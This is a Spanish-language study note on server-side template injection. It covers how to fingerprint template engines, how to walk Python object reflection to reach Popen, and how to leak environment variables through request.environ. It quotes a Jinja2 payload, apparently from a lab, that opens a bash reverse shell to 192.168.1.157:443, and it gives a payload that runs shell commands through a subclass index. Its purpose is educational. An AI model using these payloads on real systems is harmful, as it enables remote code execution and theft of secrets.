### ¿Qué es SSTI? 
El Server-Side Template Injection traduciría a algo como Inyección en las Plantillas del Lado del Servidor, y acontece cuando es capaz de inyectar un payload malicioso en una de estas plantillas, normalmente en forma de comandos. Los *template engines* funcionan interpretando información de inputs y modificando la estructura estática de la página con contenido dinámico, que cambia por distintos factores como las acciones del usuario.
Cuando la sanitización de los campos que modifican esta información es insuficiente, el atacante puede aprovecharse enviando comandos directamente al servidor, llevando al control total del sistema en forma de RCEs o similares.
Realmente, no es que los comandos se envíen directamente, la idea es ir probando distintos payloads para identificar a que template engine nos enfrentamos, una vez ya sabemos esto, podemos explotar de manera crítica buscando el RCE.
![[ssti.png|554x334]]
Por ejemplo, en un laboratorio que acabo de resolver, tras descubrir con `{{7*7}}` que estaba trabajando con un Jinja2, sirviéndome de los recursos de PayLoadsAllTheThings y PortSwigger conseguimos muy fácilmente una revshell con esta línea:
``` python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/192.168.1.157/443 0>&1'").read() }}
```

```php
{{8*'2'}} # Python: 22222222, PHP: 16
{{8*2}} # Python: 16, PHP: 16
```

## Metodología

![[SSTI-steps.png|373x384]]

# Reflection
Reflection es la habilidad de ciertos lenguajes de examinarse a si mismos (Python entre ellos), pudiendo listar sus propiedad y métodos y cambiando su estado interno.
En python se puede hacer fetch a a un objeto con `__class__`, y se puede ver el padre de dicho objeto con `__base__`
Se puede ir subiendo hasta el objetivo raíz encadenando `__base__`
```python
{{request.__class__.__base__.__base__.__base__<...>}}
# Al llegar a object, el parent superior, se pued bajar de nuevo usando __subclasses__
{{request.__class__.__base__.__base__.__subclasses__()}}
# Al identificar una clase jugosa, como Popen, hay que identificar su ID (en este caso 282) para llamarla
{{request.__class__.__base__.__base__.__subclasses__()[282]("env", shell=True,
stdout=-1).communicate()[0]}}
```

# Payloads 
En la mayoría de casos, este payload mostrará un error si es que la web es vulnerable a SSTI:
```
${{>%[%'"}}%\. 
```

```python
request.environ
```
> 	"Not to worry. There is a quick payload that works on both Flask
	and Django Jinja2 templates, and it’s a good one: `request.environ`. In
	both frameworks, this Python object holds information about the
	current request: HTTP method, headers, user data, and, most
	importantly, environment variables loaded by the app."
### Recursos
[Demostración de Seven Seas Security](https://youtu.be/8o5QPU-BvFQ)
[SSTImap](https://github.com/vladko312/SSTImap)
[Table de template injection](https://cheatsheet.hackmanit.de/template-injection-table/)
[Demo de explotación](https://youtu.be/8o5QPU-BvFQ?list=PL65_wYSEg5HdSq1pSZxQmz7SoNE48vOgR)
### Artículos
[Artículo de PayLoadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
[PortSwigger](https://portswigger.net/web-security/server-side-template-injection)
